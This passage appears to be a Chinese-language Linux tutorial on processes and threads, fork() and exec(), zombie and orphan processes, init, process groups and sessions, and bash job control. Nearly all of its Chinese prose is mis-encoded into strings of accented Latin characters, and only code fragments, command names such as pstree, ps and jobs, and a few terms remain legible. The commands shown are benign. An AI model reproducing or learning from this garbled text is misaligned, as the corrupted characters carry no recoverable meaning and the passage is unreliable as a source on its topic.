ä¸­å„ç§æ´»åŠ¨ä¹‹é—´çš„åŠ¨æ€æ€§ã€å¹¶å‘æ€§ã€ç‹¬ç«‹æ€§è¿˜æœ‰ç›¸äº’åˆ¶çº¦æ€§ã€‚ç¨‹åºå°±åƒä¸€ä¸ªå…¬å¸ï¼Œåªæ˜¯ä¸€äº›è¯ä¹¦ï¼Œæ–‡ä»¶çš„å †ç§¯ï¼ˆé™æ€å®ä½“ï¼‰ã€‚è€Œå½“å…¬å¸è¿ä½œèµ·æ¥å°±æœ‰å„ä¸ªéƒ¨é—¨çš„åŒºåˆ†ï¼Œè´¢åŠ¡éƒ¨ï¼ŒæŠ€æœ¯éƒ¨ï¼Œé”€å”®éƒ¨ç­‰ç­‰ï¼Œå°±åƒå„ä¸ªè¿›ç¨‹ï¼Œå„ä¸ªéƒ¨é—¨ä¹‹é—´å¯ä»¥ç‹¬ç«‹è¿åšï¼Œä¹Ÿå¯ä»¥æœ‰äº¤äº’ï¼ˆç‹¬ç«‹æ€§ã€å¹¶å‘æ€§ï¼‰ã€‚ è€Œéšç€ç¨‹åºçš„å‘å±•è¶Šåšè¶Šå¤§ï¼Œåˆä¼šç»§ç»­ç»†åˆ†ï¼Œä»è€Œå¼•å…¥äº†çº¿ç¨‹çš„æ¦‚å¿µï¼Œå½“ä»£å¤šæ•°æ“ä½œç³»ç»Ÿã€Linux 2.6åŠæ›´æ–°çš„ç‰ˆæœ¬ä¸­ï¼Œè¿›ç¨‹æœ¬èº«ä¸æ˜¯åŸºæœ¬è¿è¡Œå•ä½ï¼Œè€Œæ˜¯çº¿ç¨‹çš„å®¹å™¨ã€‚å°±åƒä¸Šè¿°æ‰€è¯´çš„ï¼Œæ¯ä¸ªéƒ¨é—¨åˆä¼šç»†åˆ†ä¸ºå„ä¸ªå·¥ä½œå°ç»„ï¼ˆçº¿ç¨‹ï¼‰ï¼Œè€Œå·¥ä½œå°ç»„éœ€è¦çš„èµ„æºéœ€è¦å‘ä¸Šçº§ï¼ˆè¿›ç¨‹ï¼‰ç”³è¯·ã€‚ çº¿ç¨‹ï¼ˆthreadï¼‰æ˜¯æ“ä½œç³»ç»Ÿèƒ½å¤Ÿè¿›è¡Œè¿ç®—è°ƒåº¦çš„æœ€å°å•ä½ã€‚å®ƒè¢«åŒ…å«åœ¨è¿›ç¨‹ä¹‹ä¸­ï¼Œæ˜¯è¿›ç¨‹ä¸­çš„å®é™…è¿ä½œå•ä½ã€‚ä¸€æ¡çº¿ç¨‹æŒ‡çš„æ˜¯è¿›ç¨‹ä¸­ä¸€ä¸ªå•ä¸€é¡ºåºçš„æ§åˆ¶æµï¼Œä¸€ä¸ªè¿›ç¨‹ä¸­å¯ä»¥å¹¶å‘å¤šä¸ªçº¿ç¨‹ï¼Œæ¯æ¡çº¿ç¨‹å¹¶è¡Œæ‰§è¡Œä¸åŒçš„ä»»åŠ¡ã€‚å› ä¸ºçº¿ç¨‹ä¸­å‡ ä¹ä¸åŒ…å«ç³»ç»Ÿèµ„æºï¼Œæ‰€ä»¥æ‰§è¡Œæ›´å¿«ã€æ›´æœ‰æ•ˆç‡ã€‚ ç®€è€Œè¨€ä¹‹,ä¸€ä¸ªç¨‹åºè‡³å°‘æœ‰ä¸€ä¸ªè¿›ç¨‹,ä¸€ä¸ªè¿›ç¨‹è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹ã€‚çº¿ç¨‹çš„åˆ’åˆ†å°ºåº¦å°äºè¿›ç¨‹ï¼Œä½¿å¾—å¤šçº¿ç¨‹ç¨‹åºçš„å¹¶å‘æ€§é«˜ã€‚å¦å¤–ï¼Œè¿›ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æ‹¥æœ‰ç‹¬ç«‹çš„å†…å­˜å•å…ƒï¼Œè€Œå¤šä¸ªçº¿ç¨‹å…±äº«å†…å­˜ï¼Œä»è€Œæå¤§åœ°æé«˜äº†ç¨‹åºçš„è¿è¡Œæ•ˆç‡ã€‚å°±å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 2 è¿›ç¨‹çš„å±æ€§ 2.1 è¿›ç¨‹çš„åˆ†ç±» ç¬¬ä¸€ä¸ªè§’åº¦æ¥çœ‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ†ä¸ºç”¨æˆ·è¿›ç¨‹ä¸ç³»ç»Ÿè¿›ç¨‹ï¼š ç”¨æˆ·è¿›ç¨‹ï¼šé€šè¿‡æ‰§è¡Œç”¨æˆ·ç¨‹åºã€åº”ç”¨ç¨‹åºæˆ–ç§°ä¹‹ä¸ºå†…æ ¸ä¹‹å¤–çš„ç³»ç»Ÿç¨‹åºè€Œäº§ç”Ÿçš„è¿›ç¨‹ï¼Œæ­¤ç±»è¿›ç¨‹å¯ä»¥åœ¨ç”¨æˆ·çš„æ§åˆ¶ä¸‹è¿è¡Œæˆ–å…³é—­ã€‚ ç³»ç»Ÿè¿›ç¨‹ï¼šé€šè¿‡æ‰§è¡Œç³»ç»Ÿå†…æ ¸ç¨‹åºè€Œäº§ç”Ÿçš„è¿›ç¨‹ï¼Œæ¯”å¦‚å¯ä»¥æ‰§è¡Œå†…å­˜èµ„æºåˆ†é…å’Œè¿›ç¨‹åˆ‡æ¢ç­‰ç›¸å¯¹åº•å±‚çš„å·¥ä½œï¼›è€Œä¸”è¯¥è¿›ç¨‹çš„è¿è¡Œä¸å—ç”¨æˆ·çš„å¹²é¢„ï¼Œå³ä½¿æ˜¯ root ç”¨æˆ·ä¹Ÿä¸èƒ½å¹²é¢„ç³»ç»Ÿè¿›ç¨‹çš„è¿è¡Œã€‚ ç¬¬äºŒè§’åº¦æ¥çœ‹ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿›ç¨‹åˆ†ä¸ºäº¤äº’è¿›ç¨‹ã€æ‰¹å¤„ç†è¿›ç¨‹ã€å®ˆæŠ¤è¿›ç¨‹ äº¤äº’è¿›ç¨‹ï¼šç”±ä¸€ä¸ª shell ç»ˆç«¯å¯åŠ¨çš„è¿›ç¨‹ï¼Œåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œéœ€è¦ä¸ç”¨æˆ·è¿›è¡Œäº¤äº’æ“ä½œï¼Œå¯ä»¥è¿è¡Œäºå‰å°ï¼Œä¹Ÿå¯ä»¥è¿è¡Œåœ¨åå°ã€‚ æ‰¹å¤„ç†è¿›ç¨‹ï¼šè¯¥è¿›ç¨‹æ˜¯ä¸€ä¸ªè¿›ç¨‹é›†åˆï¼Œè´Ÿè´£æŒ‰é¡ºåºå¯åŠ¨å…¶ä»–çš„è¿›ç¨‹ã€‚ å®ˆæŠ¤è¿›ç¨‹ï¼šå®ˆæŠ¤è¿›ç¨‹æ˜¯ä¸€ç›´è¿è¡Œçš„ä¸€ç§è¿›ç¨‹ï¼Œåœ¨ Linux ç³»ç»Ÿå¯åŠ¨æ—¶å¯åŠ¨ï¼Œåœ¨ç³»ç»Ÿå…³é—­æ—¶ç»ˆæ­¢ã€‚å®ƒä»¬ç‹¬ç«‹äºæ§åˆ¶ç»ˆç«¯å¹¶ä¸”å‘¨æœŸæ€§çš„æ‰§è¡ŒæŸç§ä»»åŠ¡æˆ–ç­‰å¾…å¤„ç†æŸäº›å‘ç”Ÿçš„äº‹ä»¶ã€‚ä¾‹å¦‚ httpd è¿›ç¨‹ï¼Œä¸€ç›´å¤„äºè¿è¡ŒçŠ¶æ€ï¼Œç­‰å¾…ç”¨æˆ·çš„è®¿é—®ã€‚è¿˜æœ‰ç»å¸¸ç”¨çš„ cronï¼ˆåœ¨ centOS ç³»åˆ—ä¸º crondï¼‰è¿›ç¨‹ï¼Œè¿™ä¸ªè¿›ç¨‹ä¸º crontab çš„å®ˆæŠ¤è¿›ç¨‹ï¼Œå¯ä»¥å‘¨æœŸæ€§çš„æ‰§è¡Œç”¨æˆ·è®¾å®šçš„æŸäº›ä»»åŠ¡ã€‚ 2.2 è¿›ç¨‹çš„è¡ç”Ÿ è¿›ç¨‹æœ‰è¿™ä¹ˆå¤šçš„ç§ç±»ï¼Œé‚£ä¹ˆè¿›ç¨‹ä¹‹é—´å®šæ˜¯æœ‰ç›¸å…³æ€§çš„ï¼Œè€Œè¿™äº›æœ‰å…³è”æ€§çš„è¿›ç¨‹åˆæ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Œå¦‚ä½•è¡ç”Ÿçš„ï¼Ÿ å°±æ¯”å¦‚æˆ‘ä»¬å¯åŠ¨äº†ç»ˆç«¯ï¼Œå°±æ˜¯å¯åŠ¨äº†ä¸€ä¸ª bash è¿›ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ bash ä¸­å†è¾“å…¥ bash åˆ™ä¼šå†å¯åŠ¨ä¸€ä¸ª bash çš„è¿›ç¨‹ï¼Œæ­¤æ—¶ç¬¬äºŒä¸ª bash è¿›ç¨‹å°±æ˜¯ç”±ç¬¬ä¸€ä¸ª bash è¿›ç¨‹åˆ›å»ºå‡ºæ¥çš„ï¼Œä»–ä»¬ä¹‹é—´åˆæ˜¯ä¸ªä»€ä¹ˆå…³ç³»ï¼Ÿ æˆ‘ä»¬ä¸€èˆ¬ç§°å‘¼ç¬¬ä¸€ä¸ª bash è¿›ç¨‹æ˜¯ç¬¬äºŒ bash è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ï¼Œç¬¬äºŒ bash è¿›ç¨‹æ˜¯ç¬¬ä¸€ä¸ª bash è¿›ç¨‹çš„å­è¿›ç¨‹ï¼Œè¿™å±‚å…³ç³»æ˜¯å¦‚ä½•å¾—æ¥çš„å‘¢ï¼Ÿ å…³äºçˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹ä¾¿ä¼šæåŠè¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ fork() ä¸ exec() fork-execæ˜¯ç”± Dennis M. Ritchie åˆ›é€ çš„ fork() æ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼ˆsystem callï¼‰ï¼Œå®ƒçš„ä¸»è¦ä½œç”¨å°±æ˜¯ä¸ºå½“å‰çš„è¿›ç¨‹åˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œè¿™ä¸ªæ–°çš„è¿›ç¨‹å°±æ˜¯å®ƒçš„å­è¿›ç¨‹ï¼Œè¿™ä¸ªå­è¿›ç¨‹é™¤äº†çˆ¶è¿›ç¨‹çš„è¿”å›å€¼å’Œ PID ä»¥å¤–å…¶ä»–çš„éƒ½ä¸€æ¨¡ä¸€æ ·ï¼Œå¦‚è¿›ç¨‹çš„æ‰§è¡Œä»£ç æ®µï¼Œå†…å­˜ä¿¡æ¯ï¼Œæ–‡ä»¶æè¿°ï¼Œå¯„å­˜å™¨çŠ¶æ€ç­‰ç­‰ exec() ä¹Ÿæ˜¯ç³»ç»Ÿè°ƒç”¨ï¼Œä½œç”¨æ˜¯åˆ‡æ¢å­è¿›ç¨‹ä¸­çš„æ‰§è¡Œç¨‹åºä¹Ÿå°±æ˜¯æ›¿æ¢å…¶ä»çˆ¶è¿›ç¨‹å¤åˆ¶è¿‡æ¥çš„ä»£ç æ®µä¸æ•°æ®æ®µ å­è¿›ç¨‹å°±æ˜¯çˆ¶è¿›ç¨‹é€šè¿‡ç³»ç»Ÿè°ƒç”¨ fork() è€Œäº§ç”Ÿçš„å¤åˆ¶å“ï¼Œfork() å°±æ˜¯æŠŠçˆ¶è¿›ç¨‹çš„ PCB ç­‰è¿›ç¨‹çš„æ•°æ®ç»“æ„ä¿¡æ¯ç›´æ¥å¤åˆ¶è¿‡æ¥ï¼Œåªæ˜¯ä¿®æ”¹äº† PIDï¼Œæ‰€ä»¥ä¸€æ¨¡ä¸€æ ·ï¼Œåªæœ‰åœ¨æ‰§è¡Œ exec() ä¹‹åæ‰ä¼šä¸åŒï¼Œè€Œæ—©å…ˆçš„ fork() æ¯”è¾ƒæ¶ˆè€—èµ„æºåæ¥è¿›åŒ–æˆ vfork(),æ•ˆç‡é«˜äº†ä¸å°‘ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥æŸ¥æŸ¥ä¸ºä»€ä¹ˆã€‚ è¿™å°±æ˜¯å­è¿›ç¨‹äº§ç”Ÿçš„ç”±æ¥ã€‚ç®€å•çš„å®ç°é€»è¾‘å°±å¦‚ä¸‹æ–¹æ‰€ç¤ºã€æ³¨é‡Šï¼‘ã€‘ 123456789pid_t p;p = fork();if (p == (pid_t) -1) /* ERROR */else if (p == 0) /* CHILD */else /* PARENT */ æ—¢ç„¶å­è¿›ç¨‹æ˜¯é€šè¿‡çˆ¶è¿›ç¨‹è€Œè¡ç”Ÿå‡ºæ¥çš„ï¼Œé‚£ä¹ˆå­è¿›ç¨‹çš„é€€å‡ºä¸èµ„æºçš„å›æ”¶å®šç„¶ä¸çˆ¶è¿›ç¨‹æœ‰å¾ˆå¤§çš„ç›¸å…³æ€§ã€‚å½“ä¸€ä¸ªå­è¿›ç¨‹è¦æ­£å¸¸çš„ç»ˆæ­¢è¿è¡Œæ—¶ï¼Œæˆ–è€…è¯¥è¿›ç¨‹ç»“æŸæ—¶å®ƒçš„ä¸»å‡½æ•° main() ä¼šæ‰§è¡Œ exit(n); æˆ–è€… return nï¼Œè¿™é‡Œçš„è¿”å›å€¼ n æ˜¯ä¸€ä¸ªä¿¡å·ï¼Œç³»ç»Ÿä¼šæŠŠè¿™ä¸ª SIGCHLD ä¿¡å·ä¼ ç»™å…¶çˆ¶è¿›ç¨‹ï¼Œå½“ç„¶è‹¥æ˜¯å¼‚å¸¸ç»ˆæ­¢ä¹Ÿå¾€å¾€æ˜¯å› ä¸ºè¿™ä¸ªä¿¡å·ã€‚ åœ¨å°†è¦ç»“æŸæ—¶çš„å­è¿›ç¨‹ä»£ç æ‰§è¡Œéƒ¨åˆ†å·²ç»ç»“æŸæ‰§è¡Œäº†ï¼Œç³»ç»Ÿçš„èµ„æºä¹ŸåŸºæœ¬å½’è¿˜ç»™ç³»ç»Ÿäº†ï¼Œä½†è‹¥æ˜¯å…¶è¿›ç¨‹çš„è¿›ç¨‹æ§åˆ¶å—ï¼ˆPCBï¼‰ä»é©»ç•™åœ¨å†…å­˜ä¸­ï¼Œè€Œå®ƒçš„ PCB è¿˜åœ¨ï¼Œä»£è¡¨è¿™ä¸ªè¿›ç¨‹è¿˜å­˜åœ¨ï¼ˆå› ä¸º PCB å°±æ˜¯è¿›ç¨‹å­˜åœ¨çš„å”¯ä¸€æ ‡å¿—ï¼Œé‡Œé¢æœ‰ PID ç­‰æ¶ˆæ¯ï¼‰ï¼Œå¹¶æ²¡æœ‰æ¶ˆäº¡ï¼Œè¿™æ ·çš„è¿›ç¨‹ç§°ä¹‹ä¸ºåƒµå°¸è¿›ç¨‹ï¼ˆZombieï¼‰ã€‚ å¦‚å›¾ä¸­ç¬¬å››åˆ—æ ‡é¢˜æ˜¯ Sï¼ŒS è¡¨ç¤ºçš„æ˜¯è¿›ç¨‹çš„çŠ¶æ€ï¼Œè€Œåœ¨ä¸‹å±çš„ç¬¬ä¸‰è¡Œçš„ Z è¡¨ç¤ºçš„æ˜¯ Zombie çš„æ„æ€ã€‚ï¼ˆ ps å‘½ä»¤å°†åœ¨åç»­è¯¦è§£ï¼‰ æ­£å¸¸æƒ…å†µä¸‹ï¼Œçˆ¶è¿›ç¨‹ä¼šæ”¶åˆ°ä¸¤ä¸ªè¿”å›å€¼ï¼šexit codeï¼ˆSIGCHLD ä¿¡å·ï¼‰ä¸ reason for termination ã€‚ä¹‹åï¼Œçˆ¶è¿›ç¨‹ä¼šä½¿ç”¨ wait(&amp;status) ç³»ç»Ÿè°ƒç”¨ä»¥è·å–å­è¿›ç¨‹çš„é€€å‡ºçŠ¶æ€ï¼Œç„¶åå†…æ ¸å°±å¯ä»¥ä»å†…å­˜ä¸­é‡Šæ”¾å·²ç»“æŸçš„å­è¿›ç¨‹çš„ PCBï¼›è€Œå¦‚è‹¥çˆ¶è¿›ç¨‹æ²¡æœ‰è¿™ä¹ˆåšçš„è¯ï¼Œå­è¿›ç¨‹çš„ PCB å°±ä¼šä¸€ç›´é©»ç•™åœ¨å†…å­˜ä¸­ï¼Œä¸€ç›´ç•™åœ¨ç³»ç»Ÿä¸­æˆä¸ºåƒµå°¸è¿›ç¨‹ï¼ˆZombieï¼‰ã€‚ è™½ç„¶åƒµå°¸è¿›ç¨‹æ˜¯å·²ç»æ”¾å¼ƒäº†å‡ ä¹æ‰€æœ‰å†…å­˜ç©ºé—´ï¼Œæ²¡æœ‰ä»»ä½•å¯æ‰§è¡Œä»£ç ï¼Œä¹Ÿä¸èƒ½è¢«è°ƒåº¦ï¼Œåœ¨è¿›ç¨‹åˆ—è¡¨ä¸­ä¿ç•™ä¸€ä¸ªä½ç½®ï¼Œè®°è½½è¯¥è¿›ç¨‹çš„é€€å‡ºçŠ¶æ€ç­‰ä¿¡æ¯ä¾›å…¶çˆ¶è¿›ç¨‹æ”¶é›†ï¼Œä»è€Œé‡Šæ”¾å®ƒã€‚ä½†æ˜¯ Linux ç³»ç»Ÿä¸­èƒ½ä½¿ç”¨çš„ PID æ˜¯æœ‰é™çš„ï¼Œå¦‚æœç³»ç»Ÿä¸­å­˜åœ¨æœ‰å¤§é‡çš„åƒµå°¸è¿›ç¨‹ï¼Œç³»ç»Ÿå°†ä¼šå› ä¸ºæ²¡æœ‰å¯ç”¨çš„ PID ä»è€Œå¯¼è‡´ä¸èƒ½äº§ç”Ÿæ–°çš„è¿›ç¨‹ã€‚ å¦å¤–å¦‚æœçˆ¶è¿›ç¨‹ç»“æŸï¼ˆéæ­£å¸¸çš„ç»“æŸï¼‰ï¼Œæœªèƒ½åŠæ—¶æ”¶å›å­è¿›ç¨‹ï¼Œå­è¿›ç¨‹ä»åœ¨è¿è¡Œï¼Œè¿™æ ·çš„å­è¿›ç¨‹ç§°ä¹‹ä¸ºå­¤å„¿è¿›ç¨‹ã€‚åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œå­¤å„¿è¿›ç¨‹ä¸€èˆ¬ä¼šè¢« init è¿›ç¨‹æ‰€â€œæ”¶å…»â€ï¼Œæˆä¸º init çš„å­è¿›ç¨‹ã€‚ç”± init æ¥åšå–„åå¤„ç†ï¼Œæ‰€ä»¥å®ƒå¹¶ä¸è‡³äºåƒåƒµå°¸è¿›ç¨‹é‚£æ ·æ— äººé—®æ´¥ï¼Œä¸ç®¡ä¸é¡¾ï¼Œå¤§é‡å­˜åœ¨ä¼šæœ‰å±å®³ã€‚ è¿›ç¨‹ 0 æ˜¯ç³»ç»Ÿå¼•å¯¼æ—¶åˆ›å»ºçš„ä¸€ä¸ªç‰¹æ®Šè¿›ç¨‹ï¼Œä¹Ÿç§°ä¹‹ä¸ºå†…æ ¸åˆå§‹åŒ–ï¼Œå…¶æœ€åä¸€ä¸ªåŠ¨ä½œå°±æ˜¯è°ƒç”¨ fork() åˆ›å»ºå‡ºä¸€ä¸ªå­è¿›ç¨‹è¿è¡Œ /sbin/init å¯æ‰§è¡Œæ–‡ä»¶,è€Œè¯¥è¿›ç¨‹å°±æ˜¯ PID=1 çš„è¿›ç¨‹ 1ï¼Œè€Œè¿›ç¨‹ 0 å°±è½¬ä¸ºäº¤æ¢è¿›ç¨‹ï¼ˆä¹Ÿè¢«ç§°ä¸ºç©ºé—²è¿›ç¨‹ï¼‰ï¼Œè¿›ç¨‹ 1 ï¼ˆinit è¿›ç¨‹ï¼‰æ˜¯ç¬¬ä¸€ä¸ªç”¨æˆ·æ€çš„è¿›ç¨‹ï¼Œå†ç”±å®ƒä¸æ–­è°ƒç”¨ fork() æ¥åˆ›å»ºç³»ç»Ÿé‡Œå…¶ä»–çš„è¿›ç¨‹ï¼Œæ‰€ä»¥å®ƒæ˜¯æ‰€æœ‰è¿›ç¨‹çš„çˆ¶è¿›ç¨‹æˆ–è€…ç¥–å…ˆè¿›ç¨‹ã€‚åŒæ—¶å®ƒæ˜¯ä¸€ä¸ªå®ˆæŠ¤ç¨‹åºï¼Œç›´åˆ°è®¡ç®—æœºå…³æœºæ‰ä¼šåœæ­¢ã€‚ é€šè¿‡ä»¥ä¸‹çš„å‘½ä»¤æˆ‘ä»¬å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°è¿™æ ·çš„ç»“æ„ 1pstree æˆ–è€…ä»æ­¤å›¾æˆ‘ä»¬å¯ä»¥æ›´åŠ å½¢è±¡çš„çœ‹æ¸…å­çˆ¶è¿›ç¨‹çš„å…³ç³» é€šè¿‡ä»¥ä¸Šçš„æ˜¾ç¤ºç»“æœæˆ‘ä»¬å¯ä»¥çœ‹çš„å¾ˆæ¸…æ¥šï¼Œinit ä¸ºæ‰€æœ‰è¿›ç¨‹çš„çˆ¶è¿›ç¨‹æˆ–è€…è¯´æ˜¯ç¥–å…ˆè¿›ç¨‹ æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨è¿™æ ·ä¸€ä¸ªå‘½ä»¤æ¥çœ‹ï¼Œå…¶ä¸­ pid å°±æ˜¯è¯¥è¿›ç¨‹çš„ä¸€ä¸ªå”¯ä¸€ç¼–å·ï¼Œppid å°±æ˜¯è¯¥è¿›ç¨‹çš„çˆ¶è¿›ç¨‹çš„ pidï¼Œcommand è¡¨ç¤ºçš„æ˜¯è¯¥è¿›ç¨‹é€šè¿‡æ‰§è¡Œä»€ä¹ˆæ ·çš„å‘½ä»¤æˆ–è€…è„šæœ¬è€Œäº§ç”Ÿçš„ 1ps ï¼fxo user,ppid,pid,pgid,command å¯ä»¥åœ¨å›¾ä¸­çœ‹è§æˆ‘ä»¬æ‰§è¡Œçš„ ps å°±æ˜¯ç”± zsh é€šè¿‡ fork-exec åˆ›å»ºçš„å­è¿›ç¨‹è€Œæ‰§è¡Œçš„ ä½¿ç”¨è¿™æ ·çš„ä¸€ä¸ªå‘½ä»¤æˆ‘ä»¬ä¹Ÿèƒ½æ¸…æ¥šçš„çœ‹è§ init å¦‚ä¸Šæ–‡æ‰€è¯´æ˜¯ç”±è¿›ç¨‹ 0 è¿™ä¸ªåˆå§‹åŒ–è¿›ç¨‹æ¥åˆ›å»ºå‡ºæ¥çš„å­è¿›ç¨‹,è€Œå…¶ä»–çš„è¿›ç¨‹åŸºæœ¬æ˜¯ç”± init åˆ›å»ºçš„å­è¿›ç¨‹ï¼Œæˆ–è€…æ˜¯ç”±å®ƒçš„å­è¿›ç¨‹åˆ›å»ºå‡ºæ¥çš„å­è¿›ç¨‹ã€‚æ‰€ä»¥ init æ˜¯ç”¨æˆ·è¿›ç¨‹çš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ä¹Ÿæ˜¯æ‰€æœ‰ç”¨æˆ·è¿›ç¨‹çš„çˆ¶è¿›ç¨‹æˆ–è€…ç¥–å…ˆè¿›ç¨‹ã€‚ï¼ˆps å‘½ä»¤å°†åœ¨åç»­è¯¾ç¨‹è¯¦è§£ï¼‰ å°±åƒä¸€ä¸ªæ ‘çŠ¶å›¾ï¼Œè€Œ init è¿›ç¨‹å°±æ˜¯è¿™æ£µæ ‘çš„æ ¹ï¼Œå…¶ä»–è¿›ç¨‹ç”±æ ¹ä¸æ–­çš„å‘æ•£ï¼Œå¼€ææ•£å¶ 2.3 è¿›ç¨‹ç»„ä¸Sessions æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½ä¼šæ˜¯ä¸€ä¸ªè¿›ç¨‹ç»„çš„æˆå‘˜ï¼Œè€Œä¸”è¿™ä¸ªè¿›ç¨‹ç»„æ˜¯å”¯ä¸€å­˜åœ¨çš„ï¼Œä»–ä»¬æ˜¯ä¾é  PGIDï¼ˆprocess group IDï¼‰æ¥åŒºåˆ«çš„ï¼Œè€Œæ¯å½“ä¸€ä¸ªè¿›ç¨‹è¢«åˆ›å»ºçš„æ—¶å€™ï¼Œå®ƒä¾¿ä¼šæˆä¸ºå…¶çˆ¶è¿›ç¨‹æ‰€åœ¨ç»„ä¸­çš„ä¸€å‘˜ã€‚ ä¸€èˆ¬æƒ…å†µï¼Œè¿›ç¨‹ç»„çš„ PGID ç­‰åŒäºè¿›ç¨‹ç»„çš„ç¬¬ä¸€ä¸ªæˆå‘˜çš„ PIDï¼Œå¹¶ä¸”è¿™æ ·çš„è¿›ç¨‹ç§°ä¸ºè¯¥è¿›ç¨‹ç»„çš„é¢†å¯¼è€…,ä¹Ÿå°±æ˜¯é¢†å¯¼è¿›ç¨‹ï¼Œè¿›ç¨‹ä¸€èˆ¬é€šè¿‡ä½¿ç”¨ getpgrp() ç³»ç»Ÿè°ƒç”¨æ¥å¯»æ‰¾å…¶æ‰€åœ¨ç»„çš„ PGIDï¼Œé¢†å¯¼è¿›ç¨‹å¯ä»¥å…ˆç»ˆç»“ï¼Œæ­¤æ—¶è¿›ç¨‹ç»„ä¾ç„¶å­˜åœ¨ï¼Œå¹¶æŒæœ‰ç›¸åŒçš„PGIDï¼Œç›´åˆ°è¿›ç¨‹ç»„ä¸­æœ€åä¸€ä¸ªè¿›ç¨‹ç»ˆç»“ã€‚ ä¸è¿›ç¨‹ç»„ç±»ä¼¼ï¼Œæ¯å½“ä¸€ä¸ªè¿›ç¨‹è¢«åˆ›å»ºçš„æ—¶å€™ï¼Œå®ƒä¾¿ä¼šæˆä¸ºå…¶çˆ¶è¿›ç¨‹æ‰€åœ¨ Session ä¸­çš„ä¸€å‘˜ï¼Œæ¯ä¸€ä¸ªè¿›ç¨‹ç»„éƒ½ä¼šåœ¨ä¸€ä¸ª Session ä¸­ï¼Œå¹¶ä¸”è¿™ä¸ª Session æ˜¯å”¯ä¸€å­˜åœ¨çš„ï¼Œ Session ä¸»è¦æ˜¯é’ˆå¯¹ä¸€ä¸ª tty å»ºç«‹ï¼ŒSession ä¸­çš„æ¯ä¸ªè¿›ç¨‹éƒ½ç§°ä¸ºä¸€ä¸ªå·¥ä½œ(job)ã€‚æ¯ä¸ªä¼šè¯å¯ä»¥è¿æ¥ä¸€ä¸ªç»ˆç«¯(control terminal)ã€‚å½“æ§åˆ¶ç»ˆç«¯æœ‰è¾“å…¥è¾“å‡ºæ—¶ï¼Œéƒ½ä¼ é€’ç»™è¯¥ä¼šè¯çš„å‰å°è¿›ç¨‹ç»„ã€‚Session æ„ä¹‰åœ¨äºå°†å¤šä¸ª jobs å›Šæ‹¬åœ¨ä¸€ä¸ªç»ˆç«¯ï¼Œå¹¶å–å…¶ä¸­çš„ä¸€ä¸ª job ä½œä¸ºå‰å°ï¼Œæ¥ç›´æ¥æ¥æ”¶è¯¥ç»ˆç«¯çš„è¾“å…¥è¾“å‡ºä»¥åŠç»ˆç«¯ä¿¡å·ã€‚ å…¶ä»– jobs åœ¨åå°è¿è¡Œã€‚ å‰å°ï¼ˆforegroundï¼‰å°±æ˜¯åœ¨ç»ˆç«¯ä¸­è¿è¡Œï¼Œèƒ½ä¸ä½ æœ‰äº¤äº’çš„ åå°ï¼ˆbackgroundï¼‰å°±æ˜¯åœ¨ç»ˆç«¯ä¸­è¿è¡Œï¼Œä½†æ˜¯ä½ å¹¶ä¸èƒ½ä¸å…¶ä»»ä½•çš„äº¤äº’ï¼Œä¹Ÿä¸ä¼šæ˜¾ç¤ºå…¶æ‰§è¡Œçš„è¿‡ç¨‹ 2.4 å·¥ä½œç®¡ç† bash(Bourne-Again shell)æ”¯æŒå·¥ä½œæ§åˆ¶ï¼ˆjob controlï¼‰,è€Œ shï¼ˆBourne shellï¼‰å¹¶ä¸æ”¯æŒã€‚ å¹¶ä¸”æ¯ä¸ªç»ˆç«¯æˆ–è€…è¯´ bash åªèƒ½ç®¡ç†å½“å‰ç»ˆç«¯ä¸­çš„ jobï¼Œä¸èƒ½ç®¡ç†å…¶ä»–ç»ˆç«¯ä¸­çš„ jobã€‚æ¯”å¦‚æˆ‘å½“å‰å­˜åœ¨ä¸¤ä¸ª bash åˆ†åˆ«ä¸º bash1ã€bash2ï¼Œbash1 åªèƒ½ç®¡ç†å…¶è‡ªå·±é‡Œé¢çš„ job å¹¶ä¸èƒ½ç®¡ç† bash2 é‡Œé¢çš„ job æˆ‘ä»¬éƒ½çŸ¥é“å½“ä¸€ä¸ªè¿›ç¨‹åœ¨å‰å°è¿ä½œæ—¶æˆ‘ä»¬å¯ä»¥ç”¨ ctrl + c æ¥ç»ˆæ­¢å®ƒï¼Œä½†æ˜¯è‹¥æ˜¯åœ¨åå°çš„è¯å°±ä¸è¡Œäº†ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ &amp; è¿™ä¸ªç¬¦å·ï¼Œè®©æˆ‘ä»¬çš„å‘½ä»¤åœ¨åå°ä¸­è¿è¡Œ 1ls &amp; å›¾ä¸­æ‰€æ˜¾ç¤ºçš„ [1] 236åˆ†åˆ«æ˜¯è¯¥ job çš„ job number ä¸è¯¥è¿›ç¨‹çš„ PIDï¼Œè€Œæœ€åä¸€è¡Œçš„ Done è¡¨ç¤ºè¯¥å‘½ä»¤å·²ç»åœ¨åå°æ‰§è¡Œå®Œæ¯•ã€‚ æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ ctrl + z ä½¿æˆ‘ä»¬çš„å½“å‰å·¥ä½œåœæ­¢å¹¶ä¸¢åˆ°åå°ä¸­å» è¢«åœæ­¢å¹¶æ”¾ç½®åœ¨åå°çš„å·¥ä½œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‘½ä»¤æ¥æŸ¥çœ‹ 1jobs å…¶ä¸­ç¬¬ä¸€åˆ—æ˜¾ç¤ºçš„ä¸ºè¢«æ”¾ç½®åå° job çš„ç¼–å·ï¼Œè€Œç¬¬äºŒåˆ—çš„ ï¼‹ 